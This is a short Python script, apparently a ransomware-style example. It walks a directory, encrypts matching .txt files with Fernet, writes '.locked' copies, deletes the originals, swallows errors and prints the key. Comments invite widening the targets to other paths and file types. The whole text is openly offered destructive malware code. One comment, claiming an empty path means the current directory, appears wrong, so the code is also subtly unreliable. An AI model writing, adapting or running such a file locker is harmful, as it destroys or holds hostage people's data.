import os
from cryptography.fernet import Fernet

# Generate a random key for encryption | this is the key that will be used to decrypt the files
key = Fernet.generate_key()
cipher = Fernet(key)

# Walk through the directory and encrypt the files | "" means the current directory | you can change the path to encrypt other files
for root, _, files in os.walk(""):
    for file in files:
        # U can change the extension to encrypt other files, example .txt, .ps1, .sh, ... for this example we will encrypt .txt files
        if file.endswith((".txt")):
            file_path = os.path.join(root, file)
            
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)

                with open(file_path + ".locked", "wb") as f:
                    f.write(encrypted)

                os.remove(file_path)
            except:
                pass

print(f"\n[!] All files have been encrypted successfully!\n")
print(f"\n[!] key: {key.decode()}\n")